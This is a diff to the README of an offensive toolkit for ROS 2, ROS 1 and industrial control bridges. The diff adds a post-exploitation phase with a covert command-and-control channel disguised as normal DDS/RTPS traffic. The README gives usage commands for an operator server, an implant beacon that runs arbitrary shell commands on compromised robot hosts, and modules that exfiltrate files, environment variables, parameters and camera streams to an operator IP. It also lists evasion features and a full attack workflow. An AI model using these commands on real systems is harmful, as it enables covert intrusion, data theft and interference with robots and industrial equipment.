@@ -9,9 +9,9 @@
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
 ```
 
-**DDS/RTPS + ROS 1 + ICS/OT Bridge Offensive Security Assessment Framework**
+**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 Offensive Security Assessment Framework**
 
-> Author: Gh057x | v0.4.0-alpha
+> Author: Gh057x | v0.5.0-alpha
 > Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT)
 
 ---
@@ -33,13 +33,14 @@
 
 ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.
 
-The framework is split into three phases:
+The framework is split into four phases covering the full attack lifecycle — from initial recon to persistent post-exploitation:
 
 | Phase | Description |
 |-------|-------------|
 | **Phase 1 — Reconnaissance** | Passive/active discovery, fingerprinting, enumeration, and security auditing |
 | **Phase 2 — Exploitation** | Topic injection, node impersonation, RTPS amplification, and parameter manipulation |
 | **Phase 3 — ICS/OT Bridge Analysis** | Attack surface analysis for DDS bridges to Modbus, DNP3, OPC UA, MQTT, EtherCAT, and AWS IoT Greengrass |
+| **Phase 4 — Post-Exploitation / C2** | Covert command-and-control channel tunneled inside DDS/RTPS traffic, persistent beaconing, and data exfiltration |
 
 ---
 
@@ -65,13 +66,18 @@ ros2reaper_framework/
     ├── ros1_injection.py      # ROS1 TCPROS topic injection
     ├── ros1_exploitation.py   # ROS1 node killing & parameter manipulation
     ├── ros1_audit.py          # ROS1 security configuration auditing
-    └── phase3/
-        ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
-        ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
-        ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
-        ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
-        ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
-        └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
+    ├── phase3/
+    │   ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
+    │   ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
+    │   ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
+    │   ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
+    │   ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
+    │   └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
+    └── phase4/
+        ├── c2_channel.py          # Covert DDS/RTPS C2 transport layer
+        ├── c2_server.py           # Operator C2 server + interactive shell
+        ├── c2_beacon.py           # Implant deployed on compromised ROS 2 hosts
+        └── c2_exfil.py            # Chunked data exfiltration over covert channel
 ```
 
 ---
@@ -84,12 +90,14 @@ cd ros2reaper_framework
 pip install -r requirements.txt
 ```
 
-> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1 and Phase 3 modules work with no ROS dependency.
+> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1, Phase 3, and Phase 4 modules work with no ROS dependency.
 >
 > Phase 3 optional dependencies (all gracefully degraded if missing):
 > ```bash
 > pip install shodan paho-mqtt pymodbus requests asyncua
 > ```
+>
+> Phase 4 has no additional dependencies — pure Python 3.8+ stdlib only.
 
 ---
 
@@ -498,6 +506,165 @@ python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 --deep -o modbus.json --
 python3 ros2reaper.py mqtt-scan   --network 10.0.0.0/24 --deep -o mqtt.json   --skip-auth
 python3 ros2reaper.py opcua-scan  --network 10.0.0.0/24 --deep -o opcua.json  --skip-auth
 python3 ros2reaper.py aws-scan    --network 10.0.0.0/24 --deep -o aws.json    --skip-auth
+```
+
+---
+
+---
+
+## Phase 4 — Post-Exploitation / C2
+
+> No ROS 2 installation required on the operator side. All modules operate at raw UDP/RTPS level. The beacon side requires Python 3.8+ on the compromised host.
+
+Phase 4 implements a covert command-and-control channel tunneled inside legitimate DDS/RTPS traffic. C2 packets are XOR-encoded and embedded in standard RTPS DATA submessages that mimic normal ROS 2 infrastructure topics (`/rosout`, `/diagnostics`, `/parameter_events`). The channel is invisible to network monitors that don't perform deep RTPS inspection.
+
+**Architecture:**
+
+```
+Operator Machine                     Compromised ROS 2 Host
+┌─────────────┐   covert DDS/RTPS   ┌──────────────────────┐
+│  c2-server  │ ◄──────────────────► │     c2-beacon        │
+│ (operator   │     disguised as     │  (implant, checks in │
+│   shell)    │   /rosout traffic    │   every N seconds)   │
+└─────────────┘                      └──────────────────────┘
+```
+
+**Covert channel design:**
+- Payloads XOR-encoded and wrapped in valid RTPS DATA submessages
+- GUID prefix rotated per session — no persistent fingerprint
+- Beacon interval jittered ±25% to defeat timing analysis
+- Masquerades as eProsima Fast DDS (most common ROS 2 middleware)
+
+---
+
+### `c2-server` — Operator C2 Server
+
+Listens for beacon check-ins, tracks active sessions, and provides an interactive shell for tasking.
+
+```bash
+# Start C2 server on domain 0
+python3 ros2reaper.py c2-server --domain-id 0 --skip-auth
+
+# With custom key and session export on exit
+python3 ros2reaper.py c2-server --domain-id 0 --c2-key mysecretkey -o c2_report.json --skip-auth
+```
+
+**Interactive shell commands:**
+
+```
+sessions                      List all active sessions
+use <session_id>              Set active session (partial ID match)
+info                          Show active session details
+results                       Show task results for active session
+
+task shell <cmd>              Run shell command on compromised host
+task sysinfo                  Collect hostname, OS, ROS env info
+task ros_enum                 Enumerate ROS 2 nodes/topics/params
+task topic_read <topic>       Read messages from a ROS topic
+
+kill                          Send KILL signal — terminate the beacon
+export <file.json>            Export all sessions and results to JSON
+exit                          Stop server
+```
+
+---
+
+### `c2-beacon` — Implant / Beacon
+
+Deployed on a compromised ROS 2 host after initial access. Checks in with the C2 server at a jittered interval, delivers task results, and receives new tasking.
+
+```bash
+# Basic beacon — check in every 30s
+python3 ros2reaper.py c2-beacon --target <c2_server_ip> --skip-auth
+
+# Custom interval + TTL (self-terminate after 20 check-ins)
+python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-interval 20 --c2-ttl 20 --skip-auth
+
+# Custom encryption key (must match server)
+python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-key mysecretkey --skip-auth
+```
+
+Supported tasks (delivered from `c2-server`):
+
+| Task | Description |
+|------|-------------|
+| `shell` | Execute arbitrary shell command, return stdout/stderr |
+| `sysinfo` | Collect hostname, user, PID, ROS distro, domain ID |
+| `ros_enum` | Enumerate ROS 2 nodes, topics, and parameters via CLI |
+| `topic_read` | Read messages from a specified ROS 2 topic |
+
+---
+
+### `c2-exfil` — Data Exfiltration
+
+Collects data on the compromised host and streams it to the C2 server via chunked EXFIL packets over the covert channel. Large payloads are automatically split into 1400-byte chunks (stays within UDP MTU) and reassembled on the operator side.
+
+```bash
+# Exfiltrate environment variables
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode env --skip-auth
+
+# Exfiltrate a file from the target filesystem
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode files --exfil-path /etc/hosts --skip-auth
+
+# Dump all ROS 2 parameter values
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode params --skip-auth
+
+# Capture and exfiltrate a ROS topic stream
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode topic --topic /camera/image_raw --skip-auth
+```
+
+Exfil modes:
+
+| Mode | Description |
+|------|-------------|
+| `env` | All environment variables and ROS configuration |
+| `files` | Read a file from the target filesystem (up to 64KB) |
+| `params` | Dump all ROS 2 parameter values across all nodes |
+| `topic` | Capture and stream a ROS 2 topic for 10 seconds |
+
+---
+
+### `c2-recv` — Exfil Receiver
+
+Listens on the operator side and reassembles chunked exfil data from a specific session.
+
+```bash
+# Receive exfil and print to stdout
+python3 ros2reaper.py c2-recv --c2-session <session_id> --skip-auth
+
+# Save to file
+python3 ros2reaper.py c2-recv --c2-session <session_id> -o stolen_data.bin --skip-auth
+
+# Longer timeout for large payloads
+python3 ros2reaper.py c2-recv --c2-session <session_id> --timeout 120 -o output.txt --skip-auth
+```
+
+---
+
+### Phase 4 Attack Workflow
+
+Full post-exploitation flow following a successful Phase 2 compromise:
+
+```bash
+# 1. Start C2 server on operator machine
+python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth
+
+# 2. Deploy beacon on compromised ROS 2 host (runs on the target)
+python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey --c2-interval 15 --skip-auth
+
+# 3. In the c2-server shell:
+#    sessions                         ← see the new session appear
+#    use <session_id>
+#    task sysinfo                     ← fingerprint the host
+#    task ros_enum                    ← map the ROS graph
+#    task shell ros2 topic list       ← arbitrary command execution
+#    task topic_read /cmd_vel         ← intercept velocity commands
+
+# 4. Exfiltrate from the compromised host
+python3 ros2reaper.py c2-exfil --target <operator_ip> --c2-key opskey --exfil-mode params --skip-auth
+
+# 5. Receive on operator side
+python3 ros2reaper.py c2-recv --c2-session <session_id> --c2-key opskey -o ros_params.txt --skip-auth
 ```
 
 ---
